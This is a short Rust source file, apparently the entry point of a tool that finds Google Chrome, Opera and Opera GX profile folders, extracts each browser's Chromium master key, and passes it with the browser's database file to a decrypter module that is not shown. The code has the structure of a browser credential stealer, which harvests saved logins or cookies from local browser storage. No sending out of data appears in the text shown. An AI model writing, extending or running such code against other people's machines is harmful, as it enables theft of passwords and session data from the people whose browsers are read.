
mod chromium;
use chromium::*;

mod chromium_decrypter;
use chromium_decrypter::Decrypter;

fn main() {
    let browsers: [chromium::ChromiumBrowser; 3] =
        [
            ChromiumBrowser::GoogleChrome,
            ChromiumBrowser::Opera,
            ChromiumBrowser::OperaGX,
        ];
    
    for browser in browsers.iter() {
        let browser = Chromium::new(*browser);

        if browser.check_path() {
            // Browser path exists, continue

            // Try to get master key
            // And decrypt it
            match browser.get_master_key() {
                Ok(key) => {
                    println!("Got master key for {}", browser.browser);
                    let db_file = browser.get_db_file();

                    // Set up decrypter & run it
                    let dec = Decrypter::new(key, db_file, browser.browser);
                    let _ = dec.run(false);
                },
                Err(err) => {
                    println!("Error while trying to get master key for {}\n{}", browser.browser, err);
                },
            }

            // Setup decrypter
            // Providing it with the database file

        } else {
            println!("Unable to find directory for: {}", browser.browser);
        }
    }

}